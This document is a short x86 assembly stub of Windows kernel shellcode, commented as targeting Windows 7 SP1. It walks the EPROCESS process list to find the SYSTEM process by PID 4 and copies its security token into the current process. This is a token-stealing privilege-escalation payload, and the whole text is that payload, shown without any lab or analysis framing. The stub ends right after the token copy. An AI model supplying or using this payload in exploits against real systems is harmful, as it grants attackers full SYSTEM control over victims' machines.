[BITS 32]

; This stub will loop through the nt!_EPROCESS structrues and steal the
; token from the SYSTEM process, identified through its PID of 4.

; Works on Windows 7 SP1

global _start

_start:
  xor eax, eax
  mov eax, [fs:eax+0x124]
  mov eax, [eax+0x50]
  mov ecx, eax
loop_processes:
  mov eax, [eax+0xb8]
  sub eax, 0xb8
  cmp dword [eax+0xb4], 4
  jnz short loop_processes
  mov edx, [eax+0xf8]
  mov [ecx+0xf8], edx
